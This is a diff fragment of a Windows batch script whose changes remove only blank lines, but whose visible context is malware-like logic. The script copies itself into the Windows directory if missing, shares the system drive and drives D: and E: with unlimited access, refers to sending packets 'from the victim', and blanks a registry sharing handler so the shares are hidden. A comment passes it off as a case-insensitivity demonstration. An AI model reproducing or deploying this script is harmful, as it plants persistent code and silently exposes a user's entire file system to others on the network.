@@ -5,7 +5,6 @@
 ::Registry Path and Commands in this script are written in lowercase
 ::to show that all commands in windows are case insensitive
 
-
 ::Checking file existence in windows system and make copy if not available
 if not exist %windir%\%0 copy %0 %windir%
 
@@ -38,7 +37,6 @@ net send [enter ip here] some packets from the victim
 net share system=%systemdrive% /unlimited
 net share data1=d:\ /unlimited
 net share data2=e:\ /unlimited
-
 
 ::Hiding shared folder
 reg add "hkcr\network\sharinghandler" /ve /t reg_sz /d "" /f
